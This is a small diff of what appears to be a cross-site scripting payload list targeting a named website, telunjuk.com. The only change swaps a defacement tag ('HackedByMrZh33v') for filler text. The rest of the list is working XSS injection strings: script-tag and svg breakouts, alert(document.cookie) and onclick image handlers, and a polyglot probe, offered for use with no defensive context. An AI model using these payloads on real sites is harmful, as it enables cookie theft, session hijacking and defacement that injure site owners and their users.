@@ -4,7 +4,7 @@ a
 </script><svg/onload=confirm(/Cross-Site-scripting Xss at telunjuk.com/)>
 "><script>alert(document.cookie)</script>
 '-alert.call(window,'Xss telunjuk.com')-'
--TEST<br><br><center><font color="red">HackedByMrZh33v<br><br><img src=x onclick=alert(document.cookie)><br><br><img src=x onclick=alert(document.domain)>
+-TEST<br><br><center><font color="red">WKWKWKWKWK<br><br><img src=x onclick=alert(document.cookie)><br><br><img src=x onclick=alert(document.domain)>
 <script>alert(document.cookie);</script>
 <script>alert(document.domain);</script>
 '';!--"<XSS>=&{()}
